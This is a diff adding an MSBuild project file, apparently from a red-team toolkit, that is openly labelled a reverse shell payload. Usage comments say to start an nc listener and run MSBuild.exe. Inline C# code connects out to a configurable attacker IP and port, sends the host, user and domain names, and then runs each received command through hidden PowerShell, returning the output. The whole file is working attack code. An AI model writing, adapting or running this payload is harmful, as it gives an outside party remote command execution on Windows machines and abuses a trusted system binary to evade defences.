@@ -1,0 +1,119 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!--
+  MSBuild Reverse Shell Payload
+  Native Windows Red Team Toolkit
+  Author: Anubhav Gain (@anubhavg-icpl)
+
+  USAGE:
+  1. Modify IP and PORT below
+  2. Start listener: nc -lvp PORT
+  3. Execute: MSBuild.exe reverse-shell.xml
+-->
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Target Name="Execute">
+    <ReverseShellTask />
+  </Target>
+  <UsingTask
+    TaskName="ReverseShellTask"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
+    <Task>
+      <Code Type="Class" Language="cs">
+      <![CDATA[
+using System;
+using System.Net;
+using System.Net.Sockets;
+using System.Text;
+using System.IO;
+using System.Diagnostics;
+using Microsoft.Build.Framework;
+using Microsoft.Build.Utilities;
+
+public class ReverseShellTask : Task
+{
+    // CONFIGURE THESE VALUES
+    private string IP = "CHANGEME";  // Your listener IP
+    private int PORT = 4444;         // Your listener port
+
+    public override bool Execute()
+    {
+        try
+        {
+            using (TcpClient client = new TcpClient(IP, PORT))
+            {
+                using (Stream stream = client.GetStream())
+                {
+                    using (StreamReader reader = new StreamReader(stream))
+                    using (StreamWriter writer = new StreamWriter(stream))
+                    {
+                        writer.AutoFlush = true;
+                        StringBuilder output = new StringBuilder();
+
+                        // Send banner
+                        output.AppendLine("=== MSBuild Reverse Shell ===");
+                        output.AppendLine("Host: " + Environment.MachineName);
+                        output.AppendLine("User: " + Environment.UserName);
+                        output.AppendLine("Domain: " + Environment.UserDomainName);
+                        output.AppendLine("=============================");
+                        writer.WriteLine(output.ToString());
+
+                        while (true)
+                        {
+                            writer.Write("PS " + Directory.GetCurrentDirectory() + "> ");
+                            string command = reader.ReadLine();
+
+                            if (string.IsNullOrEmpty(command)) break;
+                            if (command.ToLower() == "exit") break;
+
+                            // Handle cd command
+                            if (command.ToLower().StartsWith("cd "))
+                            {
+                                string newDir = command.Substring(3).Trim();
+                                try
+                                {
+                                    Directory.SetCurrentDirectory(newDir);
+                                    continue;
+                                }
+                                catch (Exception ex)
+                                {
+                                    writer.WriteLine("Error: " + ex.Message);
+                                    continue;
+                                }
+                            }
+
+                            // Execute command
+                            ProcessStartInfo psi = new ProcessStartInfo();
+                            psi.FileName = "powershell.exe";
+                            psi.Arguments = "-NoProfile -Command " + command;
+                            psi.WorkingDirectory = Directory.GetCurrentDirectory();
+                            psi.UseShellExecute = false;
+                            psi.RedirectStandardOutput = true;
+                            psi.RedirectStandardError = true;
+                            psi.CreateNoWindow = true;
+
+                            Process proc = Process.Start(psi);
+                            string stdout = proc.StandardOutput.ReadToEnd();
+                            string stderr = proc.StandardError.ReadToEnd();
+                            proc.WaitForExit();
+
+                            if (!string.IsNullOrEmpty(stdout))
+                                writer.WriteLine(stdout);
+                            if (!string.IsNullOrEmpty(stderr))
+                                writer.WriteLine("Error: " + stderr);
+                        }
+                    }
+                }
+            }
+        }
+        catch (Exception ex)
+        {
+            Console.WriteLine("Connection failed: " + ex.Message);
+        }
+        return true;
+    }
+}
+      ]]>
+      </Code>
+    </Task>
+  </UsingTask>
+</Project>
